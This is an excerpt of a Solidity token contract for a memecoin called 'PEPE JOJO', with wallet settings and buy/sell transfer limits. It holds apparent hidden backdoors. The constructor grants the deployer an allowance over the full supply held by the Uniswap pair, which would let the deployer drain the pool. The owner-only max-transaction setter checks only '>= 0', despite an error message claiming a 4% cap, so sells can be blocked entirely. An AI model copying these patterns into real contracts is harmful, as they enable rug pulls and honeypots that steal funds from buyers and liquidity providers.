...
contract PEJO is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "PEPE JOJO";
    string private _symbol = "PEJO";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xD0155b19b4f8b1B008e2aC7319FB76A4D0451043); // Marketing Address
    address payable public BuyBackWalletAddress = payable(0xD0155b19b4f8b1B008e2aC7319FB76A4D0451043); // BuyBack Address
    ...
    uint256 public _walletMax = 50000 * 10**6 * 10**9;
    ...
    constructor () {
        ...
        _allowances[address(uniswapPair)][msg.sender] = _totalSupply;
    ...
    function setMaxTxAmount(uint256 maxTxAmount) external onlyOwner() {
        require(maxTxAmount >= 0, "Max wallet should be less or euqal to 4% totalSupply");
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        {
             if (isMarketPair[sender] && !isTxLimitExempt[recipient]) {
                        require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
                }
 
                //when sell
                else if (isMarketPair[recipient] && !isTxLimitExempt[sender]) {
                        require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
                }
